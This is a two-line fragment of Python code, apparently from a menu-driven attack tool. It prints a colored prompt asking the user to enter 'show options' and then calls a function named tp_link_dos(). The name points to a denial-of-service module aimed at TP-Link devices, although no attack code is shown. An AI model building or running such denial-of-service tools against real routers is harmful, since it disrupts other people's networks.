            print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
            tp_link_dos()
